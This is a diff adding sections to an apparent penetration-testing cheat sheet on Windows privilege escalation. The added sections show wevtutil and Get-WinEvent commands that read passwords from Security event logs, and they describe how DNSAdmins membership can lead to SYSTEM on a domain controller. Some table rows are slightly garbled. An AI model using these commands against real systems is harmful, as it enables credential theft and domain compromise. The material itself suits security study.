@@ -3042,6 +3042,28 @@ The built-in utility robocopy can be used to copy files in backup mode as well. 
 
 ---
 
+##### Event Log Readers 
+
+While careful monitoring of Event Logs can be painful particularly in environments where teams are actively alerting around specific events types  
+logs can also be used to extract sensitive data, such as user passwords and accounts.   
+
+
+| **Command** | **Description** |
+| --- | --- |
+| `net localgroup "Event Log Readers"`| Add user to Event Log Readers group |
+| `wevtutil qe Security /rd:true /f:text` | Select-String "/user"`|
+| `wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 \| findstr "/user"`| Pass username and password fields to wevtuil|
+|`Get-WinEvent -LogName security \| where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} \| Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}`| we filter for process creation events (4688), which contain /user in the process command line.|
+
+---
+
+##### DNSAdmins
+
+The Windows DNS service supports custom plugins and can call functions from them to resolve name queries that are not in the scope of any locally hosted DNS zones. The DNS service runs as NT AUTHORITY\SYSTEM, so membership in this group could potentially be leveraged to escalate privileges on a Domain Controller or in a situation where a separate server is acting as the DNS server for the domain. It is possible to use the built-in dnscmd utility to specify the path of the plugin DLL
+
+
+---
+
 ### Handy Commands
 
 | **Command** | **Description** |
